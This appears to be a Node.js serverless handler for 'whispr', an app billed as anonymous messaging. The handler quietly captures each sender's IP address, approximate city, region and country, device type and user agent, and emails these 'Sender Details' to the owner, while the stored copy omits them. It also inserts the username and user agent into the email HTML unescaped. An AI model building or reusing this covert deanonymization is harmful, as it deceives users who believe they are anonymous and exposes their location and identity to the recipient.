const nodemailer = require('nodemailer');

// In-memory store (lives for duration of serverless instance)
if (!global._messages) global._messages = [];

module.exports = async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { username, message } = req.body;

  if (!username || !message) {
    return res.status(400).json({ error: 'Username and message are required' });
  }

  // ── Capture metadata from Vercel headers ──
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.headers['x-real-ip'] ||
    'Unknown';

  const userAgent = req.headers['user-agent'] || 'Unknown';

  const country  = req.headers['x-vercel-ip-country']  || 'Unknown';
  const city     = req.headers['x-vercel-ip-city']     || 'Unknown';
  const region   = req.headers['x-vercel-ip-region']   || 'Unknown';

  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent);
  const deviceType = isMobile ? 'Mobile' : 'Desktop';

  const timestamp = new Date().toISOString();
  const readableTime = new Date().toLocaleString('en-PH', { timeZone: 'Asia/Manila' });

  // ── Store message (no metadata stored) ──
  global._messages.unshift({
    id: Date.now(),
    username,
    message,
    timestamp,
  });

  // Keep max 100 messages in memory
  if (global._messages.length > 100) {
    global._messages = global._messages.slice(0, 100);
  }

  // ── Send email with full metadata ──
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const emailHtml = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f4f8; margin: 0; padding: 20px; }
    .wrapper { max-width: 520px; margin: 0 auto; }
    .card { background: #fff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
    .header { background: linear-gradient(135deg, #f02d7d, #ff6b35); padding: 24px 28px; }
    .header h2 { color: #fff; margin: 0; font-size: 20px; }
    .header small { color: rgba(255,255,255,0.8); font-size: 13px; }
    .body { padding: 28px; }
    .from { font-size: 13px; color: #999; margin-bottom: 4px; }
    .msg-text { font-size: 18px; font-weight: 600; color: #111; line-height: 1.5; margin-bottom: 28px; border-left: 4px solid #f02d7d; padding-left: 16px; }
    .meta-box { background: #f7f7fb; border-radius: 12px; padding: 18px; }
    .meta-title { font-size: 11px; letter-spacing: 1px; color: #999; text-transform: uppercase; margin-bottom: 12px; }
    .meta-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
    .meta-label { color: #888; }
    .meta-val { color: #333; font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
    .footer { padding: 16px 28px; text-align: center; color: #bbb; font-size: 12px; border-top: 1px solid #f0f0f0; }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <div class="header">
        <h2>👁 New whispr message</h2>
        <small>${readableTime}</small>
      </div>
      <div class="body">
        <div class="from">From @${username}</div>
        <div class="msg-text">${message.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</div>

        <div class="meta-box">
          <div class="meta-title">Sender Details</div>
          <div class="meta-row"><span class="meta-label">IP Address</span><span class="meta-val">${ip}</span></div>
          <div class="meta-row"><span class="meta-label">Device</span><span class="meta-val">${deviceType}</span></div>
          <div class="meta-row"><span class="meta-label">Location</span><span class="meta-val">${city}, ${region}, ${country}</span></div>
          <div class="meta-row"><span class="meta-label">User Agent</span><span class="meta-val">${userAgent}</span></div>
          <div class="meta-row"><span class="meta-label">Time (PHT)</span><span class="meta-val">${readableTime}</span></div>
        </div>
      </div>
      <div class="footer">whispr anonymous messaging</div>
    </div>
  </div>
</body>
</html>
    `;

    await transporter.sendMail({
      from: `"whispr 👁" <${process.env.EMAIL_USER}>`,
      to: process.env.OWNER_EMAIL,
      subject: `💌 New anonymous message from @${username}`,
      html: emailHtml,
    });
  } catch (emailError) {
    console.error('Email error:', emailError.message);
    // Still return success — message is stored even if email fails
  }

  return res.status(200).json({ ok: true });
};
